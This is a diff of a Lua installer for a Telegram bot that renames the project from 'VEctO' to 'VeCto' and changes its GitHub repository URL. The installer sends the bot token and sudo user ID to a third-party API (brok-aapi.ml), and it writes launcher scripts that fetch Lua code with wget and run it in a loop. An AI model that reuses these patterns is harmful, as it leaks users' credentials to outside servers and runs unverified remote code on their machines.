@@ -18,7 +18,7 @@ Write_Info_Sudo:write([[
 
 s = "mmssds"
 
-q = "TEAM_VEctO"
+q = "TEAM_VECTO"
 
 token = "]]..Token..[["
 
@@ -67,28 +67,28 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://brok-aapi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
-print("::VEctO::")
-local RunBot = io.open("VEctO", 'w')
+print("::VeCto::")
+local RunBot = io.open("VeCto", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/VEctO
+cd $HOME/VeCto
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr VEctO.lua
-wget "https://raw.githubusercontent.com/TEAMVEctO/VEctO/master/VEctO.lua"
+rm -fr VeCto.lua
+wget "https://raw.githubusercontent.com/SourceVeCto/VeCto/master/VeCto.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./VEctO.lua -p PROFILE --bot=$token
+./tg -s ./VeCto.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/VEctO
+cd $HOME/VeCto
 while(true) do
 rm -fr ../.telegram-cli
-screen -S VEctO -X kill
-screen -S VEctO ./VEctO
+screen -S VeCto -X kill
+screen -S VeCto ./VeCto
 done
 ]])
 RunTs:close()
